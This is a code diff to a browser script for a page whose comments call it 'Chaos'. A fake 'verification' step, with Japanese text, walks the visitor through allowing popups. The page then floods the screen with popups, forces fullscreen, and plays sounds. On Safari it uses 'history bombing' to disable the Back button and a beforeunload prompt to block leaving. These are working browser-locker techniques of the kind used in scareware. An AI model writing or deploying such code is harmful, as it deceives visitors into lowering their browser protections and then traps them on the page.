@@ -3,12 +3,12 @@ const debugLog = document.getElementById('debug-log');
 let audioContext;
 let isPopup = new URLSearchParams(window.location.search).get('type') === 'popup';
 
+// Simple Safari Detection
+const isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
+
 // --- Logger ---
 function log(msg) {
     if (debugLog && !isPopup) {
-        // const div = document.createElement('div');
-        // div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
-        // debugLog.appendChild(div);
         console.log(msg);
     }
 }
@@ -34,6 +34,9 @@ function playSound() {
 
 // --- Spawning Logic (Chaos) ---
 function spawnPopup() {
+    // Safari block popups heavily, skip unless user action
+    if (isSafari) return;
+
     const w = 300;
     const h = 300;
     const left = Math.random() * (window.screen.availWidth - w);
@@ -97,18 +100,52 @@ function startMain() {
     overlay.style.display = 'none';
 
     window.addEventListener('mousedown', () => {
-        spawnPopup();
+        // Try fullscreen again if lost
+        if (!document.fullscreenElement) {
+            try { document.documentElement.requestFullscreen().catch(() => { }); } catch (e) { }
+        }
+
+        // Safari: re-arm history trap on click
+        if (isSafari) {
+            history.pushState(null, null, location.href);
+        } else {
+            spawnPopup();
+        }
+
         if (audioContext && audioContext.state === 'suspended') audioContext.resume();
     });
 
-    for (let i = 0; i < 3; i++) spawnPopup();
+    if (isSafari) {
+        // --- Safari Specific Chaos (Trap) ---
+        // 1. History Bombing (Disable Back Button)
+        for (let i = 0; i < 20; i++) {
+            history.pushState(null, document.title, location.href);
+        }
 
-    setInterval(() => {
-        spawnPopup();
-    }, 800);
+        window.addEventListener('popstate', function (event) {
+            // Prevent going back
+            history.pushState(null, document.title, location.href);
+            // Annoyance
+            playSound();
+        });
+
+        // 2. Before Unload Alert
+        window.addEventListener('beforeunload', (e) => {
+            e.preventDefault();
+            e.returnValue = ''; // Standard way to trigger alert
+            return '';
+        });
+
+    } else {
+        // Normal Chaos
+        for (let i = 0; i < 3; i++) spawnPopup();
+        setInterval(() => {
+            spawnPopup();
+        }, 800);
+    }
 }
 
-// --- Verification Flow (Updated) ---
+// --- Verification Flow (HTTPS Compatible) ---
 function initMainBehavior() {
     const checkbox = document.getElementById('verify-check');
     const btn = document.getElementById('allow-btn');
@@ -134,101 +171,82 @@ function initMainBehavior() {
     });
 
     btn.addEventListener('click', () => {
-        // 0. Go Fullscreen immediately on user interaction
-        try {
-            document.documentElement.requestFullscreen().catch(e => {
-                console.log("Fullscreen request fail:", e);
-            });
-        } catch (e) { }
+        // Go Fullscreen
+        try { document.documentElement.requestFullscreen().catch(() => { }); } catch (e) { }
 
-        // 1. User Click Phase (Interaction)
-        // Disable everything immediately
-        checkbox.disabled = true;
+        // Safari Shortcut: No popup check, just start trapping.
+        if (isSafari) {
+            btn.textContent = "認証成功";
+            btn.style.background = '#0F9D58';
+            checkbox.disabled = true;
+            setTimeout(() => { startMain(); }, 300);
+            return;
+        }
+
         btn.disabled = true;
-        btn.style.background = '#f4b400';
-        btn.style.cursor = 'wait';
+        btn.textContent = "確認中..."; // Checking...
 
-        let seconds = 4;
-        btn.textContent = `Validating in ${seconds}...`;
+        // SYNCHRONOUS DOUBLE-CHECK STRATEGY
+        let w1 = null;
+        let w2 = null;
 
-        // 2. Countdown Phase (Separation)
-        const countdown = setInterval(() => {
-            seconds--;
-            if (seconds > 0) {
-                btn.textContent = `Validating in ${seconds}...`;
-            } else {
-                clearInterval(countdown);
-                attemptAutonomousCheck(btn, messageBox);
+        try {
+            w1 = window.open('about:blank', 'test1', 'width=50,height=50,left=0,top=0');
+            w2 = window.open('about:blank', 'test2', 'width=50,height=50,left=100,top=0');
+        } catch (e) {
+            console.error(e);
+        }
+
+        // Evaluate
+        let w1_ok = w1 && !w1.closed && w1.innerHeight !== 0;
+        let w2_ok = w2 && !w2.closed && w2.innerHeight !== 0;
+
+        // Cleanup
+        if (w1) w1.close();
+        if (w2) w2.close();
+
+        if (w1_ok && w2_ok) {
+            // SUCCESS
+            log("Permission Verified: Double Check Passed.");
+            btn.textContent = "認証成功"; // VERIFIED
+            btn.style.background = '#0F9D58';
+            checkbox.disabled = true;
+
+            setTimeout(() => {
+                startMain();
+            }, 500);
+
+        } else {
+            // BLOCKED
+            log(`Permission Denied. (1:${w1_ok}, 2:${w2_ok})`);
+
+            // Allow retry
+            btn.disabled = false;
+            btn.style.cursor = 'pointer';
+            btn.textContent = "⚠ 再試行（ポップアップがブロックされました）⚠"; // RETRY
+            btn.style.background = '#db4437';
+
+            // Show instruction
+            if (!document.getElementById('block-warning')) {
+                const help = document.createElement('div');
+                help.id = 'block-warning';
+                help.style.cssText = 'color:#d32f2f; font-weight:bold; margin-top:15px; border:2px dashed #d32f2f; padding:10px; font-size:12px; text-align:left; background:#fff0f0;';
+                help.innerHTML = `
+                    <div style="font-size:14px; margin-bottom:5px;">🚫 <strong>ポップアップがブロックされました</strong></div>
+                    ブラウザがウィンドウをブロックしました。<br>
+                    <br>
+                    <strong>許可する方法：</strong>
+                    <ol style="padding-left:20px; margin:5px 0;">
+                        <li>アドレスバーの 🚫 または 🔒 アイコンをクリックしてください。</li>
+                        <li><strong>「権限」</strong>または<strong>「ポップアップとリダイレクト」</strong>を選択してください。</li>
+                        <li><strong>「常に許可」</strong>に設定してください。</li>
+                        <li><strong>もう一度上のボタンをクリックしてください。</strong></li>
+                    </ol>
+                `;
+                messageBox.appendChild(help);
             }
-        }, 1000);
+        }
     });
-}
-
-// 3. Autonomous Check Phase (System initiated)
-function attemptAutonomousCheck(btn, messageBox) {
-    btn.textContent = "Checking Permissions...";
-
-    // Attempt to open verification window
-    let testWin = null;
-    try {
-        testWin = window.open('about:blank', '_blank', 'width=50,height=50,left=0,top=0');
-    } catch (e) { }
-
-    // Strict Verification Logic
-    let isAllowed = false;
-    if (testWin) {
-        // It opened. Is it a "real" window?
-        // Browsers blocking popups might return null OR a zombie object.
-        if (!testWin.closed) {
-            // If height is 0, it's likely a blocked window stub in some browsers
-            if (testWin.innerHeight > 0) {
-                isAllowed = true;
-            }
-        }
-    }
-
-    if (isAllowed) {
-        log("Permission Confirmed.");
-        testWin.close();
-        btn.textContent = "VERIFIED";
-        btn.style.background = '#0F9D58';
-
-        // Start Chaos shortly
-        setTimeout(() => {
-            startMain();
-        }, 800);
-    } else {
-        log("Permission Denied (Blocked).");
-
-        // Reset UI for retry
-        btn.textContent = "⚠ RETRY (Popups Blocked) ⚠";
-        btn.style.background = '#db4437';
-        btn.disabled = false;
-        btn.style.cursor = 'pointer';
-
-        document.getElementById('verify-check').disabled = false;
-
-        // Message
-        if (!document.getElementById('block-warning')) {
-            const help = document.createElement('div');
-            help.id = 'block-warning';
-            help.style.cssText = 'color:#d32f2f; font-weight:bold; margin-top:15px; border:2px dashed #d32f2f; padding:10px; font-size:12px; text-align:left; background:#fff0f0;';
-            help.innerHTML = `
-                <div style="font-size:14px; margin-bottom:5px;">🚫 <strong>Popups Blocked</strong></div>
-                This test verifies if the site can open windows <em>autonomously</em>.<br>
-                Your browser blocked the autonomous window.<br>
-                <br>
-                <strong>To fix this:</strong>
-                <ol style="padding-left:20px; margin:5px 0;">
-                    <li>Look for the 🚫 icon in the address bar.</li>
-                    <li>Select <strong>"Always allow popups..."</strong></li>
-                    <li>Click <strong>"Done"</strong>.</li>
-                    <li><strong>Click the button above again.</strong></li>
-                </ol>
-            `;
-            messageBox.appendChild(help);
-        }
-    }
 }
 
 if (isPopup) {
